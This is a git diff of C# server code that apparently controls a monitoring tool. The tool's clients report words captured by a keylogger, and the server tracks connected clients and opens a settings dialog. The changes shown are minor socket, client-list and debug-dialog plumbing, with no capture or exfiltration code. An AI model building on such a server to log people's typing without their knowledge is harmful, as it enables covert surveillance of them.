@@ -15,7 +15,8 @@ namespace ServerSide
     public delegate void wordFromKeylogger(string word);
     public delegate void playCurrentState(int id);
     public delegate void stopCurrentState(int id);
-    public delegate void RemoveClient(int id);
+    public delegate void RemoveClient(int id); 
+    public delegate void setSetting(int id);
     class Program
     {
         private List<Client> Allclients;
@@ -76,7 +77,7 @@ namespace ServerSide
                 {
                     //ShowErrorDialog("name " + Allclients[i].Name + "id " + Allclients[i].id);
                     s.addClientToCheckBoxLst(Allclients[i].Name, Allclients[i].id, Allclients[i].ClientSocket);
-
+                    clientIds.Add(Allclients[i].id);
                 }
 
             }
@@ -233,16 +234,14 @@ namespace ServerSide
                 // client send name at first time
                 if (dataFromClient[0] == "name")
                 {
-                    name = dataFromClient[1];
-                    String[] SplitedMessage = name.Split('\0');
-                    name = SplitedMessage[0];
-
-                    //ShowErrorDialog("|" + name + "|");
+                    name = dataFromClient[1].Split('\0')[0];
+                    
+                    ShowErrorDialog("|" + name + "|");
                     String Setting = "";
                     // set system 
-                    monitorSystem = new MonitorSetting(name);
+                    monitorSystem = new MonitorSetting();
                     // open GUI to set Setting 
-                    //monitorSystem.ShowDialog();
+                    // monitorSystem.ShowDialog();
 
                     Thread openMonitorSetting = new Thread(openMonitorDialog);
                     openMonitorSetting.SetApartmentState(ApartmentState.STA);
@@ -351,7 +350,7 @@ namespace ServerSide
                 else
                 {
                     // wait to connect from client
-                    // ShowErrorDialog("cannot send data to client in socket null");
+                     ShowErrorDialog("cannot send data to client in socket null");
                 }
             }
             
@@ -366,6 +365,7 @@ namespace ServerSide
         // Create a method for a delegate.
         public static void startCurrentState(int id)
         {
+
             if (id < program.Allclients.Count) { 
                 
                 Socket clientSocket = program.Allclients[id].ClientSocket;
@@ -410,6 +410,24 @@ namespace ServerSide
             
              
         }
+     
+        public static void setSettingDelegate() {
+        /*    String Setting = "";
+            // set system 
+            MonitorSetting monitorSystem = new MonitorSetting();
+            // open GUI to set Setting 
+            // monitorSystem.ShowDialog();
+
+            Thread openMonitorSetting = new Thread(openMonitorDialog);
+            openMonitorSetting.SetApartmentState(ApartmentState.STA);
+            openMonitorSetting.Start();
+
+            while (openMonitorSetting.IsAlive) ;
+            Setting = monitorSystem.setting; // get Setting from monitorSystem form
+         */                                    // ShowErrorDialog("Setting: \n"+Setting);
+        }
+
+
         private void removeClientfromMemory(string id)
         {
             for (int i = 0; i < Allclients.Count(); i++)
@@ -420,5 +438,8 @@ namespace ServerSide
                 }
             }
         }
+    
+    
+    
     }
 }
